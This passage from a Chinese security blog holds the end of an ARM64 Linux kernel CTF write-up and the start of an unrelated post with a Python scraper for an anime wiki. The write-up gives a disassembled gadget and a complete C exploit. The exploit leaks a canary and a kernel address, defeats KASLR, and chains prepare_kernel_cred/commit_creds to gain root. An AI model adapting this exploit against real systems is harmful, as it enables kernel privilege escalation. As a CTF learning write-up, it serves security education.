<li>ELR_EL1：保存要返回的用户态 PC 指针</li>
<li>SPSR_EL1：保存 0x80001000</li>
</ul>
<p>可以用下面这个 gadget 来填充上述数据：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0000000000011F</span>E4 <span class="number">17</span> <span class="number">41</span> <span class="number">18</span> D5                   MSR             #<span class="number">0</span>, c4, c1, #<span class="number">0</span>, X23 <span class="comment">/* msr	sp_el0, x23 */</span></span><br><span class="line">.text:<span class="number">0000000000011F</span>E8 DF <span class="number">02</span> <span class="number">7</span>C F2                   TST             X22, #<span class="number">0x10</span></span><br><span class="line">.text:<span class="number">0000000000011F</span>EC <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">54</span>                   B.EQ            loc_11FF4</span><br><span class="line">.text:<span class="number">0000000000011F</span>EC</span><br><span class="line">.text:<span class="number">0000000000011F</span>F0 <span class="number">1F</span> <span class="number">20</span> <span class="number">03</span> D5                   NOP</span><br><span class="line">.text:<span class="number">0000000000011F</span>F0</span><br><span class="line">.text:<span class="number">0000000000011F</span>F4</span><br><span class="line">.text:<span class="number">0000000000011F</span>F4                               loc_11FF4                               ; CODE XREF: sub_157D0<span class="number">-37E4</span>↑j</span><br><span class="line">.text:<span class="number">0000000000011F</span>F4 <span class="number">80</span> B7 <span class="number">46</span> F9                   LDR             X0, [X28,#<span class="number">0xD68</span>]</span><br><span class="line">.text:<span class="number">0000000000011F</span>F8 <span class="number">0B</span> <span class="number">00</span> <span class="number">00</span> <span class="number">14</span>                   B               loc_12024</span><br><span class="line">.text:<span class="number">0000000000011F</span>F8</span><br><span class="line">.text:<span class="number">0000000000011F</span>F8                               ; END OF FUNCTION CHUNK FOR sub_157D0</span><br><span class="line">.text:<span class="number">0000000000011F</span>FC</span><br><span class="line">.text:<span class="number">0000000000011F</span>FC                               ; =============== S U B R O U T I N E =======================================</span><br><span class="line">.text:<span class="number">0000000000011F</span>FC</span><br><span class="line">.text:<span class="number">0000000000011F</span>FC</span><br><span class="line">.text:<span class="number">0000000000011F</span>FC                               sub_11FFC</span><br><span class="line">.text:<span class="number">0000000000011F</span>FC</span><br><span class="line">.text:<span class="number">0000000000011F</span>FC                               ; FUNCTION CHUNK AT .text:<span class="number">0000000000012024</span> SIZE <span class="number">00000050</span> BYTES</span><br><span class="line">.text:<span class="number">0000000000011F</span>FC</span><br><span class="line">.text:<span class="number">0000000000011F</span>FC C1 BF <span class="number">00</span> D0 <span class="number">21</span> A0 <span class="number">00</span> <span class="number">91</span>       ADRL            X1, unk_180B028</span><br><span class="line">.text:<span class="number">0000000000012004</span> <span class="number">80</span> D0 <span class="number">38</span> D5                   MRS             X0, #<span class="number">0</span>, c13, c0, #<span class="number">4</span></span><br><span class="line">.text:<span class="number">0000000000012008</span> <span class="number">21</span> <span class="number">68</span> <span class="number">60</span> F8                   LDR             X1, [X1,X0]</span><br><span class="line">.text:<span class="number">000000000001200</span>C C1 <span class="number">00</span> <span class="number">00</span> B4                   CBZ             X1, loc_12024</span><br><span class="line">.text:<span class="number">000000000001200</span>C</span><br><span class="line">.text:<span class="number">0000000000012010</span> <span class="number">81</span> <span class="number">03</span> <span class="number">40</span> F9                   LDR             X1, [X28]</span><br><span class="line">.text:<span class="number">0000000000012014</span> <span class="number">81</span> <span class="number">00</span> C8 <span class="number">37</span>                   TBNZ            W1, #<span class="number">0x19</span>, loc_12024</span><br><span class="line">.text:<span class="number">0000000000012014</span></span><br><span class="line">.text:<span class="number">0000000000012018</span> E0 <span class="number">3F</span> <span class="number">01</span> <span class="number">32</span>                   MOV             W0, #<span class="number">0x80007FFF</span></span><br><span class="line">.text:<span class="number">000000000001201</span>C <span class="number">01</span> <span class="number">00</span> <span class="number">80</span> <span class="number">52</span>                   MOV             W1, #<span class="number">0</span></span><br><span class="line">.text:<span class="number">0000000000012020</span> <span class="number">1F</span> <span class="number">20</span> <span class="number">03</span> D5                   NOP</span><br><span class="line">.text:<span class="number">0000000000012020</span></span><br><span class="line">.text:<span class="number">0000000000012020</span>                               ; End of function sub_11FFC</span><br><span class="line">.text:<span class="number">0000000000012020</span></span><br><span class="line">.text:<span class="number">0000000000012024</span>                               ; START OF FUNCTION CHUNK FOR sub_157D0</span><br><span class="line">.text:<span class="number">0000000000012024</span>                               ;   ADDITIONAL PARENT FUNCTION sub_11FFC</span><br><span class="line">.text:<span class="number">0000000000012024</span></span><br><span class="line">.text:<span class="number">0000000000012024</span>                               loc_12024                               ; CODE XREF: sub_157D0<span class="number">-37</span>D8↑j</span><br><span class="line">.text:<span class="number">0000000000012024</span>                                                                       ; sub_11FFC+<span class="number">10</span>↑j</span><br><span class="line">.text:<span class="number">0000000000012024</span>                                                                       ; sub_11FFC+<span class="number">18</span>↑j</span><br><span class="line">.text:<span class="number">0000000000012024</span> <span class="number">35</span> <span class="number">40</span> <span class="number">18</span> D5                   MSR             #<span class="number">0</span>, c4, c0, #<span class="number">1</span>, X21 <span class="comment">/* msr	elr_el1, x21 */</span></span><br><span class="line">.text:<span class="number">0000000000012028</span> <span class="number">16</span> <span class="number">40</span> <span class="number">18</span> D5                   MSR             #<span class="number">0</span>, c4, c0, #<span class="number">0</span>, X22 <span class="comment">/* msr	spsr_el1, x22 */</span></span><br><span class="line">.text:<span class="number">000000000001202</span>C E0 <span class="number">07</span> <span class="number">40</span> A9                   LDP             X0, X1, [SP,#arg_0]</span><br><span class="line">.text:<span class="number">0000000000012030</span> E2 <span class="number">0F</span> <span class="number">41</span> A9                   LDP             X2, X3, [SP,#arg_10]</span><br><span class="line">.text:<span class="number">0000000000012034</span> E4 <span class="number">17</span> <span class="number">42</span> A9                   LDP             X4, X5, [SP,#arg_20]</span><br><span class="line">.text:<span class="number">0000000000012038</span> E6 <span class="number">1F</span> <span class="number">43</span> A9                   LDP             X6, X7, [SP,#arg_30]</span><br><span class="line">.text:<span class="number">000000000001203</span>C E8 <span class="number">27</span> <span class="number">44</span> A9                   LDP             X8, X9, [SP,#arg_40]</span><br><span class="line">.text:<span class="number">0000000000012040</span> EA <span class="number">2F</span> <span class="number">45</span> A9                   LDP             X10, X11, [SP,#arg_50]</span><br><span class="line">.text:<span class="number">0000000000012044</span> EC <span class="number">37</span> <span class="number">46</span> A9                   LDP             X12, X13, [SP,#arg_60]</span><br><span class="line">.text:<span class="number">0000000000012048</span> EE <span class="number">3F</span> <span class="number">47</span> A9                   LDP             X14, X15, [SP,#arg_70]</span><br><span class="line">.text:<span class="number">000000000001204</span>C F0 <span class="number">47</span> <span class="number">48</span> A9                   LDP             X16, X17, [SP,#arg_80]</span><br><span class="line">.text:<span class="number">0000000000012050</span> F2 <span class="number">4F</span> <span class="number">49</span> A9                   LDP             X18, X19, [SP,#arg_90]</span><br><span class="line">.text:<span class="number">0000000000012054</span> F4 <span class="number">57</span> <span class="number">4</span>A A9                   LDP             X20, X21, [SP,#arg_A0]</span><br><span class="line">.text:<span class="number">0000000000012058</span> F6 <span class="number">5F</span> <span class="number">4B</span> A9                   LDP             X22, X23, [SP,#arg_B0]</span><br><span class="line">.text:<span class="number">000000000001205</span>C F8 <span class="number">67</span> <span class="number">4</span>C A9                   LDP             X24, X25, [SP,#arg_C0]</span><br><span class="line">.text:<span class="number">0000000000012060</span> FA <span class="number">6F</span> <span class="number">4</span>D A9                   LDP             X26, X27, [SP,#arg_D0]</span><br><span class="line">.text:<span class="number">0000000000012064</span> FC <span class="number">77</span> <span class="number">4</span>E A9                   LDP             X28, X29, [SP,#arg_E0]</span><br><span class="line">.text:<span class="number">0000000000012068</span> FE <span class="number">7B</span> <span class="number">40</span> F9                   LDR             X30, [SP,#arg_F0]</span><br><span class="line">.text:<span class="number">000000000001206</span>C FF <span class="number">43</span> <span class="number">05</span> <span class="number">91</span>                   ADD             SP, SP, #<span class="number">0x150</span></span><br><span class="line">.text:<span class="number">0000000000012070</span> E0 <span class="number">03</span> <span class="number">9F</span> D6                   ERET</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>最后需要注意：不能执行 <code>system(&quot;/bin/sh&quot;)</code>，会触发缺页机制 </p>
<p>完整 exp 如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_sp_v;</span><br><span class="line"><span class="keyword">size_t</span> *user_sp = &amp;user_sp_v;</span><br><span class="line"><span class="keyword">char</span>* tmpbuf[<span class="number">0x1000</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> canary;</span><br><span class="line"><span class="keyword">size_t</span> kernel_addr;</span><br><span class="line"><span class="keyword">size_t</span> kernel_base;</span><br><span class="line"><span class="keyword">size_t</span> offset;</span><br><span class="line"><span class="keyword">size_t</span> commit_creds = <span class="number">0xffff8000080a2258</span>;</span><br><span class="line"><span class="keyword">size_t</span> prepare_kernel_cred = <span class="number">0xffff8000080a24f8</span>;</span><br><span class="line"><span class="keyword">size_t</span> gadget1 = <span class="number">0xffff800008011fe4</span>;</span><br><span class="line"><span class="keyword">size_t</span> gadget2 = <span class="number">0xffff800008016950</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;mov x11, %0&quot;</span> : : <span class="string">&quot;r&quot;</span> (user_sp));</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;mov x12, sp&quot;</span>);</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;str x12, [x11]&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_root</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;mov x11, %0&quot;</span> : : <span class="string">&quot;r&quot;</span> (user_sp));</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;ldr x12, [x11]&quot;</span>);</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;mov sp, x12&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;root&quot;</span>);</span><br><span class="line">    <span class="comment">//system(&quot;/bin/sh&quot;);</span></span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;/flag&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    read(fd, tmpbuf, <span class="number">0x40</span>);</span><br><span class="line">    write(<span class="number">1</span>, tmpbuf, <span class="number">0x40</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    save_status();</span><br><span class="line">    <span class="keyword">size_t</span> buf[<span class="number">0x200</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;/proc/demo&quot;</span>, O_RDWR);</span><br><span class="line"></span><br><span class="line">    read(fd, buf, <span class="number">0x200</span>);</span><br><span class="line">    canary = buf[<span class="number">12</span>];</span><br><span class="line">    kernel_addr = buf[<span class="number">2</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;canary: 0x%llx\n&quot;</span>,canary);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;kernel_addr: 0x%llx\n&quot;</span>,kernel_addr);</span><br><span class="line"></span><br><span class="line">    offset = kernel_addr - <span class="number">0xffff8000082376f8</span>; </span><br><span class="line">	kernel_base = <span class="number">0xffff800008000000</span> + offset; </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;kernel_base: 0x%lx\n&quot;</span>,kernel_base);</span><br><span class="line"></span><br><span class="line">    commit_creds = commit_creds + offset;</span><br><span class="line">    prepare_kernel_cred = prepare_kernel_cred + offset;</span><br><span class="line"></span><br><span class="line">    gadget1 = gadget1 + offset;</span><br><span class="line">    gadget2 = gadget2 + offset;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;gadget1: 0x%lx\n&quot;</span>,gadget1);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;gadget2: 0x%lx\n&quot;</span>,gadget2);</span><br><span class="line">    <span class="comment">//sleep(2);</span></span><br><span class="line"></span><br><span class="line">    buf[<span class="number">16</span>] = canary;</span><br><span class="line"></span><br><span class="line">    buf[<span class="number">18</span>] = gadget2;</span><br><span class="line">    buf[<span class="number">22</span>] = prepare_kernel_cred+<span class="number">4</span>; <span class="comment">// X19</span></span><br><span class="line">    buf[<span class="number">26</span>] = <span class="number">0</span>;</span><br><span class="line">    buf[<span class="number">32</span>] = commit_creds+<span class="number">4</span>;       <span class="comment">// X30</span></span><br><span class="line"></span><br><span class="line">    buf[<span class="number">36</span>] = gadget2;</span><br><span class="line">    buf[<span class="number">42</span>] = gadget1;</span><br><span class="line"></span><br><span class="line">    buf[<span class="number">45</span>] = get_root;</span><br><span class="line">    buf[<span class="number">46</span>] = <span class="number">0x80001000</span>;</span><br><span class="line">    buf[<span class="number">47</span>] = buf;</span><br><span class="line">    </span><br><span class="line">    write(fd, buf, <span class="number">0x200</span>);</span><br><span class="line">    close(fd);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<hr>
<p><strong>小结：</strong></p>
<p>第一次打 ARM 的内核题目，调试很久找不到 gadget，最后的 gadget 还是抄的别人的</p>
<p>太菜了，现在找 gadget 还很迷茫，以后有经验了再总结吧</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/03/12/%E7%9F%A5%E8%AF%86%E5%9B%BE%E8%B0%B1%E5%AE%9E%E8%B7%B5%E9%A1%B9%E7%9B%AE%E4%B8%89/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/03/12/%E7%9F%A5%E8%AF%86%E5%9B%BE%E8%B0%B1%E5%AE%9E%E8%B7%B5%E9%A1%B9%E7%9B%AE%E4%B8%89/" class="post-title-link" itemprop="url">知识图谱实践项目三</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-03-12 16:05:44 / Modified: 18:04:39" itemprop="dateCreated datePublished" datetime="2023-03-12T16:05:44+08:00">2023-03-12</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Knowledge-Graph/" itemprop="url" rel="index"><span itemprop="name">Knowledge Graph</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>16k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>15 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="知识图谱实践项目三"><a href="#知识图谱实践项目三" class="headerlink" title="知识图谱实践项目三"></a>知识图谱实践项目三</h2><p>这次爬取的目标是：<a target="_blank" rel="noopener" href="https://www.bnacg.com/">二次元动漫百科 - 白鸟ACG (bnacg.com)</a> （想做一个番剧知识图谱）</p>
<p>爬虫代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-#</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">import</span> requests, re</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urljoin, urlencode</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Crawler</span>:</span></span><br><span class="line">    target_url = <span class="string">&#x27;https://www.bnacg.com/dm/list_1_&#x27;</span></span><br><span class="line">    base_url = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    name_file = <span class="number">0</span></span><br><span class="line">    platform_file = <span class="number">0</span></span><br><span class="line">    seiyuu_file = <span class="number">0</span></span><br><span class="line">    classify_file = <span class="number">0</span></span><br><span class="line">    role_name_file = <span class="number">0</span></span><br><span class="line">    role_img_file = <span class="number">0</span></span><br><span class="line">    author_file = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_base_html</span>(<span class="params">self,url</span>):</span></span><br><span class="line">        res = requests.get(url,headers)</span><br><span class="line">        text = res.text.encode(<span class="string">&#x27;ISO-8859-1&#x27;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> text</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">create_list</span>(<span class="params">self</span>):</span></span><br><span class="line">        base_html = self.get_base_html(self.base_url)</span><br><span class="line">        soup = BeautifulSoup(base_html, <span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line">        html = soup.findAll(<span class="string">&quot;ul&quot;</span>, &#123;<span class="string">&quot;class&quot;</span>: <span class="string">&quot;result-list&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">        url_list = re.findall(<span class="string">&#x27;&lt;a class=&quot;img-wrap&quot; href=&quot;(.*?)&quot; rel=&quot;nofollow&quot;&#x27;</span>, <span class="built_in">str</span>(html))</span><br><span class="line"></span><br><span class="line">        name_list = []</span><br><span class="line">        author_list = []</span><br><span class="line">        role_img_list = []</span><br><span class="line">        role_name_list = []</span><br><span class="line">        classify_list = []</span><br><span class="line">        seiyuu_list =[]</span><br><span class="line">        platform_list = []</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> url <span class="keyword">in</span> url_list:</span><br><span class="line">            url_html = self.get_base_html(url)</span><br><span class="line">            soup = BeautifulSoup(url_html, <span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line">            name = re.findall(<span class="string">&#x27;&lt;div class=&quot;ts18 bold&quot;&gt; (.*?) /&#x27;</span>, <span class="built_in">str</span>(url_html))</span><br><span class="line">            classify = re.findall(<span class="string">&#x27;&lt;div class=&quot;rw_ju&quot;&gt; &lt;span class=&quot;bold&quot;&gt;类型：&lt;/span&gt;(.*?)&lt;/div&gt;&#x27;</span>,url_html)</span><br><span class="line">            role_name = re.findall(<span class="string">&#x27;title=&quot;(.*?)&quot; alt=&quot;&#x27;</span>,url_html)</span><br><span class="line">            role_img = re.findall(<span class="string">&#x27;&lt;img src=&quot;(.*?)&quot; title=&quot;&#x27;</span>,url_html)</span><br><span class="line">            seiyuu = re.findall(<span class="string">&#x27;&lt;div class=&quot;rw_ju&quot;&gt; &lt;span class=&quot;bold&quot;&gt;人物配音：&lt;/span&gt;(.*?)&lt;/div&gt;&#x27;</span>,url_html)</span><br><span class="line">            author = re.findall(<span class="string">&#x27;&lt;dd class=&quot;canshu value&quot;&gt;(.*?)&lt;/dd&gt;&#x27;</span>,url_html)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(role_name)):</span><br><span class="line">                role_name[i] = <span class="built_in">str</span>(role_name[i]).replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">            name_list.append(name[<span class="number">0</span>])</span><br><span class="line">            role_img_list.append(role_img[<span class="number">1</span>:])</span><br><span class="line">            role_name_list.append(role_name)</span><br><span class="line">            author_list.append(author[<span class="number">2</span>])</span><br><span class="line">            platform_list.append(author[<span class="number">3</span>])</span><br><span class="line">            seiyuu_list.append(seiyuu)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">len</span>(classify) != <span class="number">0</span>):</span><br><span class="line">                classify_list.append(classify[<span class="number">0</span>].split(<span class="string">&#x27;,&#x27;</span>))</span><br><span class="line"></span><br><span class="line">        <span class="comment">#for i in list(zip(name_list,author_list,platform_list,classify_list,seiyuu_list,role_name_list,role_img_list)):</span></span><br><span class="line">            <span class="comment">#print(i)</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">25</span>):</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">len</span>(role_img_list[i])!=<span class="built_in">len</span>(role_img_list[i])):</span><br><span class="line">                <span class="built_in">print</span>(role_img_list[i])</span><br><span class="line">                <span class="built_in">print</span>(role_name_list[i])</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(name_list)):</span><br><span class="line">            self.name_file.write(<span class="built_in">str</span>(name_list[i].replace(<span class="string">&#x27;《&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;》&#x27;</span>, <span class="string">&#x27;&#x27;</span>)) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">            self.author_file.write(<span class="built_in">str</span>(author_list[i].replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;&#x27;</span>)) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">            self.platform_file.write(<span class="built_in">str</span>(platform_list[i].replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;&#x27;</span>)) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">            self.classify_file.write(<span class="built_in">str</span>(classify_list[i])[<span class="number">1</span>:-<span class="number">1</span>].replace(<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;,&#x27;</span>,<span class="string">&#x27;&#x27;</span>) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">            self.seiyuu_file.write(<span class="built_in">str</span>(seiyuu_list[i])[<span class="number">1</span>:-<span class="number">1</span>].replace(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27;&#x27;</span>) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">            self.role_name_file.write(<span 